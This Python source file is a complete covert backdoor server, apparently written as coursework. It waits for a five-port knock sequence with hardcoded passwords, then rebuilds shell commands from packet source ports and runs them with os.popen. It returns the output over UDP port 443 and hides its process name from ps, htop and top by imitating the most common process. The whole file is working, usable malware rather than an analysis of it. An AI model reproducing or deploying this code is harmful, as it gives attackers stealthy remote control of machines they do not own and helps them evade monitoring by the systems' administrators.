###########################################################################################################
# SOURCE FILE:		final_backdoor.py - A stealthy backdoor server that can execute remote commands
#
# PROGRAM:		    backdoor
#
# FUNCTIONS:		    xor_crypt
#                      remoteExecute
#
#	LAST MODIFIED:		October 6, 2014
#
#	DESIGNERS:	        Zach Smoroden & Slade Solobay
#
#	PROGRAMMERS:        Slade Solobay & Zach Smoroden
#
#	NOTES:
#	This program listens for the client to send remote commands. They will be run, and the results sent
#  	back to the client encrypted.
#
#  OUTPUT: commands/data is printed to standard out to easily see what is happening while testing.
#
#	USAGE: python final_backdoor.py
#
##############################################################################################################

import setproctitle
import sys
import logging
import re
import socket
import fcntl
import struct

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
from itertools import izip, cycle


################ USER DEFINED ########################################
INTERFACE_ = 'em1'

# Ports must be the same as the client.
KNOCK1 = 1075
PASS1 = '$f%g'

KNOCK2 = 2078
PASS2 = '!~fD'

KNOCK3 = 3079
PASS3 = '[";-'

KNOCK4 = 4067
PASS4 = '|JG,'

KNOCK5 = 5075
PASS5 = 'cfF^'

CHANNEL = 80
SEND_PORT = 443

# Filter is tcpdump format
FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK1, KNOCK2, KNOCK3, KNOCK4, KNOCK5,
                                                                            CHANNEL)

# Must make sure it is the same as the client
ENCRYPTION_KEY = "zdehjk"
######################################################################
knockSequence = 0
command = ''
cmdLen = 0




def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

######################################################################
##	FUNCTION:	    xor_crypt
##
##	INTERFACE:	    xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY, encode=False, decode=False)
##
##				    data:   The payload of the packet sent from the client that contains the
##                          command to execute
##                  ENCRYPTION_KEY:    The encryption ENCRYPTION_KEY.
##                                     Defaults to the user-defined variable ENCRYPTION_KEY
##                  encode: When true, encrypt the data. Default is False.
##                  decode: When true, decode the data. Default is False.
##
##	RETURNS:        The encoded or decoded data.
##
##	LAST MODIFIED:  October 6, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        Use this function for both encryption and decryption. only one of encode/decode needs to be
##          specified in the call.
##
######################################################################
def xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY):
    message = ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(data, cycle(ENCRYPTION_KEY)))
    return message

######################################################################
##	FUNCTION:	    remoteExecute
##
##	INTERFACE:	    remoteExecute(packet)
##
##				    packet:   The packet that was caught by the sniffer and is from the client.
##
##	RETURNS:        Sends response to client, prints info.
##
##	LAST MODIFIED:  October 6, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This is a callback for the sniff() call. Any packet captured will come through here.
##
######################################################################
def remoteExecute(packet):
    global knockSequence
    global command
    global cmdLen


    if knockSequence != 5:
        try:
            check_knock(packet[0][2].dport, xor_crypt(packet.load))
        except Exception as ex:
            print ex.message
            print packet.show()
        print "KnockSequence: {0}".format(knockSequence)
    else:
        if cmdLen == 0:
            cmdLen = packet[0][2].sport
            #print cmdLen
        else:
            print len(command)
            print 'Command Len: ' + str(cmdLen)
            command += chr(packet[0][2].sport)
            if len(command) == cmdLen:
                print "Running Command: " + command
                decrypt_command = os.popen(command)
                command_result = decrypt_command.read()
                print command_result

                dest_ip = packet[0][1].src
                print "Sending encrypted response.."
                lines = re.split('\n', command_result)
                for line in lines:
                    try:
                        send(IP(dst=dest_ip) / UDP(sport=4444, dport=SEND_PORT) / line)
                    except Exception as ex:
                        print ex.message
                knockSequence = 0
                cmdLen = 0
                command = ''
                return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst

######################################################################
##	FUNCTION:	    set_proc_name
##
##	INTERFACE:	   set_proc_name(newname)
##
##				    newname:   The name to change the process name that top sees.
##
##	RETURNS:        Nothing
##
##	LAST MODIFIED:  October 15, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This will only mask the proccess when looking at top. ps and htop require a different method.
##
######################################################################
def set_proc_name(newname):
    from ctypes import cdll, byref, create_string_buffer

    libc = cdll.LoadLibrary('libc.so.6')
    buff = create_string_buffer(len(newname) + 1)
    buff.value = newname
    libc.prctl(15, byref(buff), 0, 0, 0)


######################################################################
##	FUNCTION:	    check_knock
##
##	INTERFACE:	   check_knock(port, password)
##
##				    port:       The port that the packet came in on.
##                  password:   The password to verify the knock sequence.
##
##	RETURNS:        The value of the knockSequence. If 5 it is complete.
##
##	LAST MODIFIED:  November 15, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This will make sure that the knock sequence is correct.
##
######################################################################
def check_knock(port, password):
    global knockSequence
    if knockSequence == 0:
        if port == KNOCK1:
            if password == PASS1:
                knockSequence += 1
                return knockSequence
            else:
                return bad_knock()
        else:
            return bad_knock()
    elif knockSequence == 1:
        if port == KNOCK2:
            if password == PASS2:
                knockSequence += 1
                return knockSequence
            else:
                return bad_knock()
        else:
            return bad_knock()
    elif knockSequence == 2:
        if port == KNOCK3:
            if password == PASS3:
                knockSequence += 1
                return knockSequence
            else:
                return bad_knock()
        else:
            return bad_knock()
    elif knockSequence == 3:
        if port == KNOCK4:
            if password == PASS4:
                knockSequence += 1
                return knockSequence
            else:
                return bad_knock()
        else:
            return bad_knock()
    elif knockSequence == 4:
        if port == KNOCK5:
            if password == PASS5:
                knockSequence += 1
                return knockSequence
            else:
                return bad_knock()
        else:
            return bad_knock()
    elif knockSequence == 5:
        return knockSequence


######################################################################
##	FUNCTION:	    bad_knock
##
##	INTERFACE:	   bad_knock(newname)
##
##
##	RETURNS:        0 for failed knock
##
##	LAST MODIFIED:  November, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This will just reset the knockSequence and return 0.
##
######################################################################
def bad_knock():
    global knockSequence
    knockSequence = 0
    return 0


######################################################################
##	FUNCTION:	    set_proc_name
##
##	INTERFACE:	   set_proc_name(newname)
##
##				    newname:   The name to change the process name that top sees.
##
##	RETURNS:        Nothing
##
##	LAST MODIFIED:  October 15, 2014
##
##	DESIGNERS:	    Zach Smoroden & Slade Solobay
##
##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
##
##	NOTES:
##	        This will only mask the proccess when looking at top. ps and htop require a different method.
##
######################################################################
def mask_process():
    # Gets the most common process name for ps -aux/htop
    command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    command_result = command.read()
    print "The most common process for ps/htop is: {0} \n".format(command_result)

    # Masks the process for ps -aux and htop.
    setproctitle.setproctitle(command_result)

    # Gets the most common process name from top
    command = os.popen("top -bn1 | awk '{ print $12 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    command_result = command.read()

    # Masks the process for top
    set_proc_name(command_result)
    print "The most common process for top is: {0} \n".format(command_result)

###### START OF SCRIPT #######
# To show the user what it is listening for.
print FILTER

# Mask the processes.
mask_process()

# Start sniffing for packets
sniff(filter=FILTER, prn=remoteExecute)